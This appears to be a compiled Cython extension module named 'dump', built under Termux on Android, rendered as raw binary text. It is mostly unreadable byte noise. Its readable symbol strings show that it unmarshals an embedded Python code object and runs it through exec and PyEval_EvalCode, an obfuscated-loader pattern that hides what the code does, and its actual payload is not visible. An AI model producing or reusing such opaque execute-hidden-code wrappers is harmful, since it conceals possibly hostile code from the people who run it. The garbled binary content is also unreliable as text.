.�����@������E��L�����\��\	���a��L��L��q���.������������@���L��q��L������������� �B�������������K�����������������������L��L���������� ��L��L��H���,�����@���{���*�����L�����h	���]��h����� h��"��m�%��"��n���"��o���"��p"��"��q |��B��r(,�����s0������t88�����u@3��g��vHJ�����wP#��"��xX-��"��y`6��"��zhD��"��{p;��"��|x������}������~�q	������K��"������"���� ��"����'��"�������B����(��"����9��"����K��"������"����"��"����8��"����*

��"����T��"����

���"����

��������

���"���

4��"����-������2��L��L��L���M������R��L��L��L��L���r��1���w��@���L���������R���P�(

������<��"���:��+������+��������� F��K���(+������0Z��p���8���"���@<��+���H���

��� ��B��L���6�����;��L��L��B���V��H���[��@���L��B��L���{��l������@���L��L���������N�����������7��"���������������������@���L��L��L������_������		��L���B�����t-��w����������/	��:	����������W	����0��

����b	�����@g	��@���L��|	��@�����	���	��g��>h��P1Z�����2����L��3[��B��4X��B��5_��@���7 ,��@���8$���q��9(���

��:0���

��;8D��

��<@^�����=H�B��)

�����A.

��L��|	������L

��M���Q

��@���L��f

������q

�� ����v

��@���L�������

������

��L��L��L��@�������K

������A

����

����� #s��$��$�����

��%���@���&���$��(�-��z	������������(N

��$������^��

T��~��Z��$�������� �i��O��n��L��L���������q��	���@���L��L���������M��h�������������q������z������L��u��B������W������L��u��L��L����������������7��$��C<��L��L��V��`��L���[��

L��:

�����	.p��L��z���

�����*�����

=���@���

>��������

?�r������	�������z�����������������	��������������������

@	��

��L	���������$

��_��Cn�����+h

��L��|8�������#���������m����@���������8�������#`���L��8�������#hF��2	���L��

	�����@����	������$��!

��g���@����

������L���������L��

�����L��T��&�����������2d������� �)��P������������!��)��!���)��"��������8���!��)����#� ������$d� ��� � ��\�����������$P� ��� � ��������������$P� ���#� ������$P� ��� @*��������������� !*���������������%.*����"��������4����������L���&V*��������������#l*�� ���'1��y*��'����*��'����*��(����*��(����*��(>���*��(u���*��(T���*��)�*��T������� Y!��T�����������&� ��T����������7	� Y!��l�����������&� ��p����������7	��#�*��P��,'���*��(���+��(#��'+��(���3+��)?+����������#X+������'���e+��'���q+��(O��}+��(����+��(����+��(����+��(����+��#�+����� $d�+���*���(H���+��#,�� ��*!'���,��'���,��(%��',���#� ��P��-	'~��� ���� 4,����������`���:$d=,��$kI,��$lU,��$ja,��(

��m,��(-��y,��(P���,�� Y!�������������$Pb!�� � ������������7	$P� ���� Y!������������$gb!�� � ������������7	$g� ���� Y!��4����������	$fb!�� � ��8����������7	$f� ������#�,������'s���,��(����,��+�,��#�,�����['����,��'����,��'����,��(����,��(��-��("��

-����#-�����']��'-��'~��3-��(���W-��(���c-��#Y!��@���$fb!��#� ��p��7	'���� �����#x-������	'����-��'���-��(E���-��(I���-��(����-��#�,�����u'q���,��'����,��';���,��(����,��(���-��(���

-��� � �������������y	'���� ���*���(���-���� Y!��������������$eb!�� � �������������7	$e� ���� Y!��������������$fb!����"D����������&��

��.L��&� ��P����������.� � �������������$d� ��� � �������������$d� ���#,��0��

'*��,��(���',���&� ������������ � ��L����������$f� ���#� ��p��'`��� ���#� �����'���� ��� � �������������$c� ��� � �������������!$f� ��� Y!�������������''M��b!�� � �������������7	'���� ���� Y!��L����������)&� ��L����������7	� Y!�������������(&� �������������7	�,W)��H�������-�-��l�������.T:.S3.Q4.P��,�-��p�������-�-����������.Q4.P���-�-��п������.Q�.U��.S�.P��-.���������.R1.Q��,.���������,..���������,D.��(�������-�)��T�������.P���,Z.��t�������,Z.����������,k.����������,�.����������,..���������,�.��@�������,D.��\�������,�.��t�������,�.����������,�.����������,�.����������-�)����������.P���-	/����������.P1�,/���������,�)���������,,/��(�������-7/��H�������.S��.R��.Q��.P���-\/���������.P���,n/���������,W)��,�������-y/����������.R���/X�������-�/��8�������.P���,e0��\�������-l2��p�������.Q��.P���,,/����������-y/����������.R���/X��������-\/����������.P���,64��`�������,�4��h�������,�4����������,�4����������,�)����������,�.����������-i5����������.S���,|5����������-�5����������.R���-�5����������.Q��.P���-�5����������.P���-�5����������.R���,�5��$�������-�5����������.P������p

��D:

����,0�	������$������y

��L���8�������#���L���8�������# A���L���8�������#(9��L��}8�������#0���L��~8�������#8y��L��8�������#@S������	��������������

��������1(�2v��H����2���$���2��� ���2���$���2��)��� 2���)���!2x��)���"�

B��b��L���8�������#��	��T���	�������)�����

�"��L���8�������#�������	�������)������A��L���	0��������������	�������)�������������	�������)������������	�������)�����	�>��-���	�������)������b

�����	�������}��L���8�������#�V��~���	�������)��3���3��������	�������0���$���0g��@����0��@�������L���8�������#Hd��L���8�������#P��L���8�������#X���L���8�������#p}��L���8�������#x���L���8�������#�������$8�������#����L��$8�������#��t�����G&8��������8�������#�8�������#��4J��B2���@���C�2���@���D2�

�����E����������A1>2�����?�2���@���@�$��/�����

	��������������@�����@������@���o

��@���z

��@��� ���@���$���@���(s��L��00��L��8���L��@u��L��H���L��P���L�� X���

��&`���L��'h��L��(p���L��)x������+����L��,�{�����0����d��<����p��=�:��@���>����i��?��i�����u�����������0�

��$���������N��0

����������B�������������� ��H��(�������5����������

���0U��������?��B�����		����	��;��� �5���%����5U���%����5`��%����5���%����5���%�����Z�������(����%��F��	J������������(�����������H��%��B�� ����

������ ��[�� ����������� ��

�L������. ��9 �����(�����������		�����b �� �.������6�����������o

��EL��7� ��Ļ�������8���

(� ��� ���!��]���9�

��J@���:���M

���;�

���<����L���;R���<����L���9��a@���<���aL��<���aL��<��a$��<���a$��<���a@���:/��c@���:����bL���;���4<���4L���Ļ������(��m���pL���������pL��I���.	��p[7������z��qL�������qL��[�����qL��6�����������#� ������r	(����� ��� � ��4����������u$c� ���#� ��0���y'8��� ���#� ��`���}	'���!��'���!��']��!��'#��4!��(���@!��(���L!��#� ������h	'��� ����#� ������~	'9��!��'o��!��'���!��'���4!��(��@!��(b��L!��#� �����h	'���� ����#� ��0��	'���!��'��!��'t��!��':��4!��(���@!��(���L!��#� ��`��h	'@��� ����#� ������	'c��!��'���!��'��!��'���4!��(R��@!��(���L!�� � ����������8���h	'��� ���� Y!��������������&� �������������7	�,�%���������,A)���������,W)���������-i)��T�������.P���,�)��`�������-�)����������.P���-i)����������.P���-�)����������.R��.P���-i)���������.P���-�)���������.R��.P���-i)��8�������.P���-�)��T�������.R��.P���-i)����������.P���-�)����������.R��.P���,�)���������,�)���������-i)��,�������.P���,�)��@�������,�)��H�������-i)��X�������.P���,�)��l�������,�)��t�������-i)����������.P���,�)����������,�)�����������= ��F�%���%��	���<�

���%��?�2���%��@]��4'��AN��I'��Dh��@���E a��@���F$���@���G(���@���L,����(��P0����(��R8����(��S@

��L��TH���L��UP���L��XX���L��Y`���L��Zh����(��_p���<)��c��

��L��e����@���g����L��i�c��:

��j�}��@���l����L��m�i�����������������@��������L�����

��L����0��L����S�������

	�������

�	���(����9'��D'��������N'��Y'��"��	���h�����������<(������� ��L�� (���L��!0���L��"8�

��H��#@���L��$HF��@���%P���.��&T���.��'U_���L��*X7��@���,`���@���-d���@���.h2��A(��/l���S(��0p

��� ��1`�Y'��L(��T�����_(������j(���

�����@�������@������@�����(���(��:��+x�����@���)�t���(��*��(���(��e���

�(��@���L��I'��@���L����(�����8d�� -Z��L��4����L��4?��L��4�

��7)��6��(���(��8���.n��R)���D'��>	��

� ��$���?���� ��� ��$���8A��

� ��� ���8���

� ��� ���8���:@���� ��$��� ���8M��#@���� ���@���9_���

@���:$	���

	*��:�

���

	*��A:����

*����.������.�������9m���

@���<8���

;*������9���@���BT����9r����@���BT����9���^L��<N

��^L��<s��^L��<��^@���:���bL��:���aL��:z��`L��:}��_L��:���cL��B6����;

���<����$��<�

���@���<����@���<����$��:c�����:����I'��::���H+��B6����M+���%�����9���@���<:��H+��<�

��@���:���H��:���L��:�	��L��:

��L��:���L��A:�

��*L����;���<:��H+��<:��H��<����H��<s��H���9�	��QL��<���QL��<���QL��:����Ru���;����<:���H+��<:���L��<�����L��<s���L��:?���L��:�

���L��:�	���L���9	��U��<���U@���:���W@���:���V���9���@@���<�

��@���<���@@���<���@@���:���A@���:���A@���:���A@����9������<����$��<�

���@���<����@���<����$��:c�����:H���L��B6����;��c<���c@���<���c��:�

��e���:���d@���:��d@���A:	��w���A:�

��}@�����? ��6@���q��:

��$��C�=k��6$��8���@���� ��$��n���8���� ��n���8���"� ��$��n���8���� ��$��n���8�

��+� ��$���?���@���� ��$��� ���?y��� ��$���?���j� ��$��n��$��$���?���n��� ���?���@���� ��� ��� ���=�

��"� ��8��9� ��� ��$���8.��#L��n��C�8v��� ��n���=���� ��8���<� ��� ��� ��� ��� ��@����?d��@���� ���=���� ��8q��@���� ��� ��� ���������������m���L��5��o���L��~��F	���L��E �����L��i ������B��� ��/���L��,6���������De,�������.Q��.P���,.6��4�������E56��h�������.Q��.P���,n/��l�������,W)�������������������\��m���@L��!�����CL��D!�����BL���!����AB��6��f�������� � �������������D$c� ���*����!��N

��NL��*P���"������QL��#P6����Q'D"��]6��'"��i6�� ,��8����������:$P,��$e,��(z"��',���� � �������������\$f� ����� � �������������d$d� ��� Y!�������������g$db!�� � �������������7	$d� ���� Y!�������������h � �������������7	'�"��� ����,v6����������-�6��$�������.Q��.P���DXL�������.Q���-y/��d�������.R��.Q��.P���-�4��t�������.Q�������������m����L��#�����L���#������L��B%������L��#$��5���q���$������L���%��/���L��B6��-F�6������	*��G�����p7��#Y!�����*	'�%��b!�� � �������������7	$e� �����,�6����������-y/����������.Q��.P���,6����������,W)��$�������-�6��8�������.P���-�6��P�������.P���-7��l�������.S��.R��.P��.Q�.T���-�6����������.P���-7����������.S��.R��.P��.Q��-@7���������.R��.Q��.P����p�������x���mT���L��%��N

���L���������k7��<

���H�����/���L�� � ��������������$P� ���,n/����������E�4����������.P����?A��� ��� ��� ���������������mp���L��!��N

���L�����/���L��#,������'���,��(���',���/Y �������,�4��<�������-6��`�������.R����?	��L��$��C�?����$��� ���8�����5��$��$��@����/��8��F<(���%���5��� ��� ���8R�� 	@���<(���8

��!6������:

���8��!4���:

���8c���L��� ��$��C�8���"C@���$���@���"D8���#�� ��� ��� ��� ���9;��3L��<��3L��<���3L���?

��'� ��� ���8���"@���� ��� ���H)���@���I�

������I:����6����6��

z��=�

��"� ��?����� ��� ���8���$@����6����6��%I��@���%��	��@���%�8���&,� ��$��@���� ��� ���6���8���'

� ��� ��� ��� ���`7��]�����

U����6�����%�$�������d�������h�������l����������������������������������������������������������������������������������������������� ������L������d���������������������������������������� ����������������������$������l������d�����������������������������P������T������X������l����������������������p����������������������������������������������������������������������������������������������4����������������������������������������������������������������������������������������������������������������������������L��������������������������������������������������T�������	�������

�������������

�������

������4�������������������������������������������T�������	�������

��������������������������������������������������������������������������������	������

����������������������������������(

������,

������8

������P

�����������������������	������P

������������������������������������������������8�������������������������������������������8������������������������������������8������0

������L

���������������������������������� ������8���������������������������������� ������8����������������������P

�������

�������

������4����������������������`

�������

�������

������8����������������������`������x������|�����������������������������4������8������@������T�������

�������

��������������������������������������������������\	������d	������������������������������������d	������|	����������������������P������l������������������������������������p������t������x�������������������������������������������p������������������������������������������X���������������������������������������������������������������������������������������������������������<����������������������������8������t��������������������<����������������������ob_base�sq_inplace_concat�shape�visitproc�tp_init�m_init�m_slots�__pyx_empty_unicode�kind�wstr�f_gen�Py_tracefunc�__Pyx_InitCachedConstants�tp�tp_itemsize�nb_index�tp_getattro�tp_flags�tp_doc�tp_richcompare�tp_descr_set�tp_cache�tp_subclasses�value�__pyx_moduledef_slots�is_unicode�__pyx_k_cline_in_traceback�PyDictKeysObject�f_stackdepth�context_ver�__Pyx_check_binary_version�module�attr_name�PyErr_WarnEx�PyObject_Hash�PyUnicode_AsUTF8String�PyEval_EvalCode�modules�Py_hash_t�releasebufferproc�ml_meth�ml_doc�tp_dict�freefunc�PyModuleDef_Slot�__pyx_n_s_cline_in_traceback�length�wchar_t�frame�PyFrameState�recursion_headroom�previous�trash_delete_nesting�PyDict_SetItemString�list�py_line�__pyx_pymod_create�ob_type�tp_setattr�bf_getbuffer�getbufferproc�tp_clear�closure�tp_descr_get�ma_values�hash�PyFrameObject�context�t�tstate�PyObject_GetAttr�PyTraceBack_Here�PyErr_Format�__Pyx_GetBuiltinName�call�__kernel_long_t�ob_size�nb_inplace_power�sq_item�objobjargproc�long unsigned int�get�PyObject�co_names�co_freevars�co_linetable�PyASCIIObject�__Pyx_copy_spec_to_module�next�f_lasti�exc_traceback�PyErr_ExceptionMatches�PyObject_Not�PyDict_SetItem�nb_remainder�nb_positive�mp_ass_subscript�tp_iternext�ml_flags�unsigned char�interned�ascii�spec�py_frame�mid�__Pyx_CreateCodeObjectForTraceback�i�__Pyx_PyObject_Call�tp_as_async�nb_bool�nb_or�tp_methods�tp_new�__pyx_string_tab�__pyx_n_s_main�co_code�co_extra�ob_sval�op�gilstate_counter�message�__Pyx_Import�PyThreadState�ptraceback�modname�dict_version�cf�/sdcard/backups/dump.c�__pyx_module_is_main_dump�PYGEN_NEXT�nb_inplace_or�bf_releasebuffer�tp_traverse�traverseproc�doc�tp_del�_typeobject�PyTypeObject�m_index�__ARRAY_SIZE_TYPE__�s�ma_used�f_back�f_trace_lines�b_level�c_profilefunc�funcname�__Pyx_PyExec3�names�int�__pyx_moduledef�PyVarObject�nb_inplace_subtract�nb_inplace_multiply�nb_inplace_matrix_multiply�tp_base�newfunc�int64_t�__pyx_lineno�__pyx_code_cache�count�b_handler�tracing�curexc_type�__Pyx_ErrFetchInState�PyObject_SetAttr�PyDict_Contains�PyEval_MergeCompilerFlags�PyRun_StringFlags�am_aiter�PYGEN_RETURN�nb_divmod�nb_negative�nb_floor_divide�ssizeobjargproc�itemsize�tp_members�m_doc�m_free�__pyx_cython_runtime�encoding�__Pyx_StringTabEntry�co_flags�PyBytesObject�f_code�f_lineno�signed char�cframe�c_traceobj�coroutine_origin_tracking_depth�id�PyErr_SetString�ctversion�def�__pyx_pyinit_module�arg�m_base�Py_ssize_t�getattrfunc�reprfunc�nb_float�PyCFunction�tp_alloc�tp_vectorcall�_object�__pyx_f�__pyx_k_builtins�state�root_cframe�ptype�__Pyx_PyObject_GetAttrStr�tmp_tb�cf_feature_version�PyInit_dump�dict_cached_value�sq_length�tp_call�tp_str�iternextfunc�name�tp_version_tag�__pyx_k_name�co_nlocals�co_stacksize�__pyx_cfilenm�__Pyx_check_single_interpreter�f_valuestack�rtversion�c_line�PyImport_GetModuleDict�ob�PyEval_GetBuiltins�/storage/emulated/0/backups�am_send�nb_lshift�nb_rshift�mp_subscript�tp_setattro�m_methods�exc_type�thread_id�__Pyx_InitStrings�__pyx_insert_code_object�PyTuple_New�PyBytes_FromStringAndSize�PyObject_SetAttrString�clang version 13.0.1�char�binaryfunc�nb_int�nb_inplace_xor�tp_mro�unsigned int�vectorcallfunc�m_traverse�__pyx_k_marshal�PyDictObject�PyTupleObject�on_delete�tb�PyList_New�__pyx_pymod_exec_dump�__pyx_L0�setattrfunc�nb_multiply�nb_matrix_multiply�format�slot�__int64_t�__pyx_k_import�PyModuleDef_Init�pvalue�PyObject_Dir�_py_tmp�tp_basicsize�nb_true_divide�tp_weaklistoffset�getiterfunc�PyModuleDef_Base�__pyx_m�uint64_t�__pyx_empty_tuple�entries�_Py_INCREF�prev�PyTryBlock�previous_item�dict�async_gen_finalizer�use_cline_obj�tmp_value�new_max�PyImport_AddModule�PyDict_GetItemString�PyFrame_New�_Py_IS_TYPE�code�tp_name�am_await�am_anext�tp_as_mapping�__pyx_n_s_builtins�co_varnames�co_opcache_size�code_line�ma_version_tag�moddict�exc_state�async_gen_firstiter�PyModule_GetDict�use_cline�pos�__pyx_bisect_code_objects�PyUnicode_FromFormat�nb_add�nb_subtract�inquiry�nb_inplace_rshift�nb_inplace_and�buf�internal�Py_buffer�initproc�allocfunc�size_t�m_copy�__pyx_empty_bytes�__pyx_n_s_test�__Pyx_CodeObjectCacheEntry�ma_keys�PyListObject�f_globals�f_locals�async_exc�_ts�level�__Pyx_AddTraceback�PyUnicode_FromStringAndSize�__kernel_ssize_t�nb_invert�nb_inplace_floor_divide�objobjproc�getattrofunc�PyGetSetDef�tp_dictoffset�n�__pyx_filename�__pyx_n_s_name�__pyx_n_s_loads�_PyOpcache�_dictkeysobject�ready�PyInterpreterState�f_builtins�c_profileobj�o�kw�tp_getattr�PYGEN_ERROR�nb_and�tp_as_sequence�tp_iter�set�tp_is_gc�tp_bases�tp_finalize�p�intern�__pyx_clineno�co_filename�co_opcache�f_trace�stackcheck_counter�curexc_value�PyImport_ImportModuleLevelObject�PyErr_Occurred�PyCode_NewEmpty�PyMem_Malloc�ob_refcnt�tp_vectorcall_offset�nb_absolute�nb_xor�nb_inplace_add�sq_contains�tp_weaklist�__pyx_methods�__pyx_dict_cached_value�is_str�__pyx_k_main�co_kwonlyargcount�f_iblock�f_localsplus�curexc_traceback�PyInterpreterState_GetID�empty_dict�tmp�PyMem_Realloc�PyNumberMethods�was_sq_ass_slice�sq_inplace_repeat�PyMappingMethods�hashfunc�bufferinfo�ml_name�tp_getset�co_argcount�co_zombieframe�co_opcache_map�f_trace_opcodes�PyErr_Clear�global_dict�locals�tp_dealloc�destructor�mp_length�tp_hash�richcmpfunc�__uint64_t�co_posonlyargcount�co_consts�co_opcache_flag�__Pyx_CodeObjectCache�compact�recursion_depth�_cframe�filename�cython_runtime_dict�__Pyx_Globals�unaryfunc�PyAsyncMethods�ternaryfunc�setattrofunc�obj�strides�__pyx_k_loads�__pyx_k_test�__pyx_n_s_marshal�from_name�PyThreadState_Get�f_state�CFrame�PyModule_NewObject�__pyx_L1_error�py_code�Py_GetVersion�PyUnicode_InternFromString�Py_EnterRecursiveCall�__pyx_t_2�PyCompilerFlags�tp_as_number�PyBufferProcs�__pyx_dict_version�__pyx_b�on_delete_data�__pyx_find_code_object�PyOS_snprintf�PyTuple_Pack�__Pyx_GetAttr�cf_flags�long int�len�readonly�descrgetfunc�m_clear�__pyx_kp_b_s_d_d_l_Z_e_e_d_d_S_Ns_s_d_d_l�co_firstlineno�co_cell2arg�c_tracefunc�PyMethodDef�max_count�co_cellvars�to_name�exc_value�__Pyx_InitGlobals�__pyx_t_1�sendfunc�nb_inplace_remainder�sq_concat�sq_ass_item�PySequenceMethods�tp_as_buffer�setter�m_size�PyModuleDef�ob_item�ob_shash�f_blockstack�b_type�_frame�use_tracing�trash_delete_later�__pyx_t_3�globals�PySendResult�descrsetfunc�m_name�main_interpreter_id�co_name�allocated�result�bad�type�tmp_type�py_funcname�__Pyx__GetModuleGlobalName�func�tp_repr�nb_power�PyMemberDef�current_id�_is�exc_info�PyObject_GetAttrString�__Pyx_CLineForTraceback�end�PyUnicode_Decode�PyUnicode_AsUTF8�Py_LeaveRecursiveCall�ssize_t�nb_reserved�nb_inplace_lshift�sq_repeat�suboffsets�getter�__pyx_k_s_d_d_l_Z_e_e_d_d_S_Ns_s_d_d_l�__pyx_tuple_�code_object�co_weakreflist�PyCodeObject�allow_none�_Py_XDECREF�_PyErr_StackItem�PyDict_New�PyObject_Call�nb_inplace_true_divide�lenfunc�ssizeargfunc�was_sq_slice�ndim�tp_free�__pyx_d�__pyx_n_s_import�_Py_DECREF�interp�_err_stackitem�from_list�empty_list�__Pyx_ErrRestoreInState�start�����}���

������/sdcard/backups�/data/data/com.termux/files/usr/include/asm-generic�/data/data/com.termux/files/usr/include/sys�/data/data/com.termux/files/usr/include/python3.10�/data/data/com.termux/files/usr/include/python3.10/cpython�/data/data/com.termux/files/usr/lib/clang/13.0.1/include�/data/data/com.termux/files/usr/include��dump.c���posix_types.h���types.h���pyport.h���object.h���object.h���methodobject.h���descrobject.h���stddef.h���moduleobject.h���stdint.h���code.h���code.h���dictobject.h���unicodeobject.h���listobject.h���tupleobject.h���bytesobject.h���pystate.h���pystate.h���frameobject.h���pyframe.h���pyerrors.h���dictobject.h���pylifecycle.h���warnings.h���tupleobject.h���bytesobject.h���unicodeobject.h���import.h���listobject.h���traceback.h���pymem.h���ceval.h���abstract.h���ceval.h���compile.h���pythonrun.h���eval.h�����	���������



�(�6

]tKJJ	K��



�	�

�	I�uJ�

J]J	#JL��xJ��	���uJ�

J	�xJ�J	�xJ�R��K	�fJ��uJ�

J	���uJ�

J	�y<�J	�yJ�R�|��

J	���uJ�

J	�y<�J	�yJ�R�|��

J	���uJ�

J	�y<�J	�yJ�R�|��

J	��uJ�

��	�yt��|J���R�|��J'dt�J	KxJ	�'O�J	KxJ	�'O�J	KxJ	�'O�J	KJ	�xt��|��J�z

	(�t��JJ	K���J�tJ��'�J'JJ	�J&�)�9J	J�$�v<N�+�K�=�K�A�J�x�

�J�xJ

��J,J�xJ

���@��xJ���MJ�xJ�J�x���7JJJ�tJ�� JJ

JKJ7KJ��jJ��J8�:JJ��jJ��J

Jw���jJ��K��j���Jz���jJ��J

JLJh�J�v��K#J	JJN7J

K��t�

�J	JK<"�}J���JJ���

���sJ$�JJ	K��sJ�J	�J�r��(J	K��J	�~J�J	�~JoJLJnJ�	K��qJ	�J��N$�2�=�@��q���JK��J�sJ	�(�R����J�R;��L�J�	�wJ�R���w���4�J���	zJJK��sJJ�J	�wJ�R.�����s�G����sJ	�JR��$J��sJ�J	�w��J	�wJ�J��J	�wJ�R��0J��sJ�JJJ��s���	�wJR�|��<��x��R���sJ	�<��|J;�TQ��~J	KJK��sJ�JK	�u<�

J	�u��R�|��J�q<��<�q��t�s��J��sJJ�J�sJ��@��sJ	�<�|��t��sJ�J	N!P�!J7JJ�q��JLKL	�vJ�J�R��J�J�R����J�R&����!J	JPM)fJK.J	����O

���pJ�J

K��pJ�J	�t��J	�tJ�R�|��J�q����%J�&K

��K�qJ#���	J1

J4�	���q�1�J��q�	��	BLIK	�tJ�J�R�����{J��

�	�J��qJ	�JPJ)LJK.J	���q����	�wJ���|J�J

J�s������%J�&K

��K�qJ#���	J('J+�	�4�	�2�9L0I

L"M�"G$KL=JJIK�pJ�J�JLHKK�pJ0�J

�&K(=$K"K$K�qJ*��"�	�tJ�R�|���

�2

��r��JyJQ	zJJK��sJ	�

JR����sJ	�

JK	��	JQ�#�(

�Q�J�	��vJ�

�m�JJ�r��

J��

��r�'�

J	KL�L=KPu<�	J�rJ�

J

8	�

�	I�rJ�

J��<

?��sJ

��	KL��oJ���oJ��PLHL

�	fJ-J	eJ�|�	KJK��s��JP�o�	����J	�st�Rx��R�|��J�|<����t

$�pJ���J�(�	I�		�<%K9J

��p��J	�J�qJ	�J�p��J

�JPN�

H��o�

����

��

J�oJ��IK�o��J

JF

NJK��o<	���{��<�ot

�JF

NJM��o<	���J�R�|��J�o����������������������������������������������������������������������������x�����������������������������������������������������������#����������������������(�����

�T���������������-��������������������@����

�T��������������M����

�l��������������_������p��������������d���������������������u���������������������������p����������������������������������������������������������������|�����������������

�t������������������������������������

�d����������������

��������� ���������

���������������������������������������������

�����������������������h�������h������������

�Ļ������(������������������������������

��������������)�������������������:���

�����������������N���

���������\������\���

��������������j���

�p�������x�����������

����������������������

�������������������������������������������h��������������������������� ��������������������0������������

���������������������

����������������#��������������������������

��������������������0������������������

�������������������

������������������

��������	����������

���������������)���

��������	�������6���

��������3�������]���

��������	�������j���������������������o���������������������t���������������������y����������������������������������������������8�������������������@�������������������H�������������������P�������������������X�������������������`�������������������h�������������������p�������������������x����������������������������������������������������.�������������������@�������������������i��������������������������������������������������������������������������������������������������������������������������������������������������������������H�������������������x��������������������������������������������������������������������������������������������������������������������������������	�������������������������������������������������������������������������������������-�������������������9��������������������>�������������������E���

����������������Q���������������������b���������������������t�������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������/���������������������F���������������������R���������������������e���������������������s����������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������&���������������������4������������������N���������������������_���������������������v�������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������,���������������������;���������������������J���������������������d���������������������u�����������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������	���������������������	���������������������'	���������������������=	���������������������K	���������������������]	���������������������j	���������������������z	����������������������	����������������������	����������������������	����������������������	����������������������	����������������������	����������������������.note.android.ident�.dynsym�.gnu.version�.gnu.version_r�.gnu.hash�.hash�.dynstr�.rela.dyn�.rela.plt�.rodata�.eh_frame_hdr�.eh_frame�.text�.plt�.data.rel.ro�.fini_array�.dynamic�.got�.got.plt�.data�.bss�.comment�.debug_loc�.debug_abbrev�.debug_info�.debug_ranges�.debug_str�.debug_line�.symtab�.shstrtab�.strtab��crtbegin_so.c�$d.2�$d.3�$d.4�$d.5�$d.6�$x.1�__dso_handle_const�__on_dlclose�__on_dlclose_late�$d.0�ndk_build_number�ndk_version�note_android_ident�note_data�note_end�note_name�dump.c�$x.0�__pyx_moduledef�__pyx_pymod_create�__Pyx_check_single_interpreter.main_interpreter_id�__pyx_pymod_exec_dump�__pyx_string_tab�__Pyx_PyObject_Call�__Pyx_Globals�__Pyx_PyExec3�__Pyx__GetModuleGlobalName�__Pyx_GetBuiltinName�$d.1�__pyx_methods�__pyx_moduledef_slots�__pyx_k_cline_in_traceback�__pyx_n_s_import�__pyx_k_import�__pyx_k_loads�__pyx_k_main�__pyx_k_marshal�__pyx_k_name�__pyx_k_s_d_d_l_Z_e_e_d_d_S_Ns_s_d_d_l�__pyx_k_test�$d.7�$d.8�$d.9�$d.10�$d.11�__pyx_code_cache.0�__pyx_code_cache.1�__pyx_m�__pyx_empty_tuple�__pyx_empty_bytes�__pyx_empty_unicode�__pyx_d�__pyx_b�__pyx_cython_runtime�__pyx_n_s_name�__pyx_n_s_main�__pyx_n_s_marshal�__pyx_pymod_exec_dump.__pyx_dict_version�__pyx_pymod_exec_dump.__pyx_dict_cached_value�__pyx_n_s_loads�__pyx_tuple_�__pyx_n_s_test�__pyx_n_s_builtins�__pyx_n_s_cline_in_traceback�__pyx_kp_b_s_d_d_l_Z_e_e_d_d_S_Ns_s_d_d_l�__Pyx_CLineForTraceback.__pyx_dict_version�__Pyx_CLineForTraceback.__pyx_dict_cached_value�__pyx_code_cache.2�$d.12�$d.13�$d.14�__FRAME_END__�__atexit_handler_wrapper�__cxa_atexit�__cxa_finalize�__dso_handle�__emutls_unregister_key�__register_atfork�atexit�pthread_atfork�__bss_start�_end�_edata�PyInit_dump�PyModuleDef_Init�PyThreadState_Get�PyInterpreterState_GetID�PyExc_ImportError�PyErr_SetString�PyObject_GetAttrString�PyModule_NewObject�_Py_Dealloc�PyModule_GetDict�PyDict_SetItemString�_Py_NoneStruct�PyExc_AttributeError�PyErr_ExceptionMatches�PyErr_Clear�PyExc_RuntimeError�PyOS_snprintf�Py_GetVersion�PyErr_WarnEx�PyTuple_New�PyBytes_FromStringAndSize�PyUnicode_FromStringAndSize�PyImport_AddModule�PyObject_SetAttrString�PyUnicode_InternFromString�PyUnicode_Decode�PyObject_Hash�__pyx_module_is_main_dump�PyObject_SetAttr�PyImport_GetModuleDict�PyDict_GetItemString�PyTuple_Pack�PyList_New�PyDict_New�PyImport_ImportModuleLevelObject�_PyThreadState_UncheckedGet�_PyObject_GetDictPtr�_Py_FalseStruct�_Py_TrueStruct�PyObject_Not�PyErr_Occurred�PyDict_SetItem�_PyDict_GetItem_KnownHash�PyObject_GetAttr�PyUnicode_FromFormat�PyUnicode_AsUTF8�PyCode_NewEmpty�PyFrame_New�PyTraceBack_Here�PyMem_Realloc�PyMem_Malloc�__stack_chk_fail�PyExc_NameError�PyErr_Format�Py_EnterRecursiveCall�Py_LeaveRecursiveCall�PyObject_Call�PyExc_SystemError�PyObject_Dir�PyDict_Contains�PyExc_TypeError�PyEval_GetBuiltins�PyCode_Type�PyUnicode_AsUTF8String�PyEval_MergeCompilerFlags�PyRun_StringFlags�PyEval_EvalCode�_DYNAMIC���������������������������������������������������������������������������������p������p�����������������������������������������������������������������������������������������������o��������	�������	�����������������������������������*������o��������

�������

������ ����������������������������9������o��������

�������

������0�����������������������������C��������������

�������

������X���������������������������I�������������8

������8

������������������������������������Q���������������������������x���������������������������[������B�������X������X������p��������������������������e������2���������������������D������������������������������m���������������������������|������������������������������{�������������������������������������������������������������������������T�������T��������������������������������������������������� ������� ���������������������������������������������������������������������������������������������������������������x�������x�������������������������������������������������������������������������������������������������������������(�������(�������X��������������������������������������������������������������������������������������������������������h�������h��������������������������������������������������������������������������������������������������������0�����������������������������������������������������������������������������������1&�������������������������������������������������������������������������������������������������������������������������|7����������������������������������������������������,�����P����������������������������������0���������������[3�������������������������������������������������������N���������������������������������������������������������^���������������V�����������������&����������������������l�����8�����������������������������0��������������������� n�����

�����������������������������
